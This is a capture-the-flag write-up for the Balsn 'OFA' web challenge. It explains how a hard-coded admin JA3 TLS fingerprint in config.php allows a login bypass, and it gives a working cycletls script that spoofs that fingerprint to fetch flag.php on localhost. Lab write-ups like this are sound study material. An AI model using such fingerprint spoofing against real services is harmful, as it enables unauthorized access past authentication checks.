---

title: "OFA (Balsn)"
date: 2023-08-10T11:30:03+00:00
tags: ["web","JA3 impersonate"]
categories: ["CTFs"]
author: "0x0Pwn"
image: "/CTF/OFA.png"
comments: false
description: "This is a friendly server machine that is vulnerable because we can impersonate the JA3 signature."

---

## Room Information

- Room name: OFA
- Difficulty level: unknown (easy I think)
- Room link: https://balsnctf.com/challenges

![Untitled](/CTFs/OFA.png)

## Tools Used

- Docker
- Visual Studio
- Research

## Enumeration

On this type of machine, there is no need to analyse possible directories because it is not a BlackBox, we have all the code of the web page…

A screenshot of the website page:

![Untitled](/CTFs/1-OFA.png)

## Exploiting

After taking a look of the the firsts archives like index.php, I found one called config.php where i found very fast a vulnerability.

What the vulnerability did was the following: 

1- Define in a variable the JA3 signature that is unique for each client (coincidentally they leave the user admin signature here...). 

2- Then they compare it with the signature that is generated when you enter the web page with your browser…

![Untitled](/CTFs/2-OFA.png)

So the only thing left was to send a request to flag.php with the JA3 that was in config.php since that is the user admin, and we could bypass the login panel and access flag.php directly.

I learn some info of JA3 on this website → [Impersonating JA3 Fingerprints. Researchers: Max Harley, Matthew… | by Matthew Rinaldi | CU Cyber | Medium](https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42)

Then I look for some scripts of JA3 impersonating and I found one which I then modify to this:

```tsx
const initCycleTLS = require('cycletls');
// Typescript: import initCycleTLS from 'cycletls';

(async () => {
  // Initiate CycleTLS
  const cycleTLS = await initCycleTLS();

  // Send request
  const response = await cycleTLS('https://localhost:8787/flag.php', {
    body: 'username=admin',
    ja3: '771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60',
    headers:
    {
      'Content-Type' : 'application/x-www-form-urlencoded'
    }

  }, 'post');

  console.log(response);

  // Cleanly exit CycleTLS
  cycleTLS.exit();

})();
```

Then to compile the file I did on my cmd: `tsc ofa-srcipt.ts` and then to execute node `ofa-srcipt.js`

![Untitled](/CTFs/4-OFA.png)

And there is the flag…👹

## Lessons Learned

- What insights did you gain from the room?
    
    I learn more about JA3
    
- Where there any novel tools or techniques employed?
    
    The use of docker.
